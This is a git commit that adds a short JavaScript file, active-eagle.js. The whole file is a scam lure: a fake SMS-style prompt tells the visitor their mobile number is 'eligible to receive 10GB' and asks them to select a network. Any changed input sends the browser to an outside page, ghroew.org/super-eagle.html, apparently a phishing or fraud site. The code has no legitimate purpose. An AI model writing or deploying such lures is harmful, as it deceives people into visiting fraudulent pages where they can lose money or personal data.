a19e145d4b166a9cf7005b1b6e91138952fd4a35
sweet16guyz-hue <sweet16guyz@gmail.com>
2026-01-08 20:31:48 +0100

    Create active-eagle.js

---
+++ active-eagle.js
@@ -0,0 +1,5 @@
+var password = 'SELECT NETWORK'
+password=prompt('SMS: Congratulations, your mobile number is eligible to receive 10GB, click OK to Select your network','SELECT NETWORK');
+if (password != 'SELECT NETWORK') {
+location.href='https://ghroew.org/super-eagle.html';
+}
